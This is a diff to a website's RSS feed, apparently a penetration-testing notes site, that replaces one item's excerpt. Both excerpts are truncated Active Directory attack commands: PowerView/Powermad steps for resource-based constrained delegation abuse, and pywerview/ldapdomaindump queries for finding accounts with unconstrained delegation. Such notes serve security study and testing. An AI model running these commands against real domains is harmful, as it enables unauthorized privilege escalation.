@@ -73,7 +73,7 @@ Sessions # Query DC to check about domain active sessions: net group “Domain C
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/delegations/</guid>
-      <description>RBCD Exploitation https://github.com/aas-n/leHACK19 # Importing Powerview and Powermad Import-Module .\Powerview.ps1 Import-Module .\Powermad.ps1 # Authentication $TargetComputer = &amp;#34;DC01.domain.lan&amp;#34; $SecPassword = ConvertTo-SecureString &amp;#39;passw0rd&amp;#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(&amp;#39;DOMAIN\ControlledAccount&amp;#39;, $SecPassword) # Get our user&amp;#39;s SID $AttackerSID = Get-DomainUser ControlledUser -Credential $Cred -Server 10.10.10.10 -Properties objectsid | Select -Expand objectsid $ACE = Get-DomainObjectACL $TargetComputer -Credential $Cred -Server 10.10.10.10 | ?{$_.SecurityIdentifier -match $AttackerSID} # Adding a machine and getting SID New-MachineAccount -Credential $Cred -Domain domain.</description>
+      <description>Unconstrained Delegation # Nice resource for user account =/= machine account in UC http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html # AD Objects having Unconstrained Delegation issues have the TRUSTED_FOR_DELEGATION flag set # You can search for users using Pywerview $ python pywerview.py get-netuser -u ownedUser -p userPassword -d foo.lan -t dc1.foo.lan --unconstrained # You can also request through ldapdomain dump and then grep for interesting $ ldapdomaindump -u &amp;#34;foo.lan\\ownedUser&amp;#34; -p &amp;#34;userPassword&amp;#34; 192.168.30.10 $ grep TRUSTED_FOR_DELEGATION *.</description>
     </item>
     
     <item>
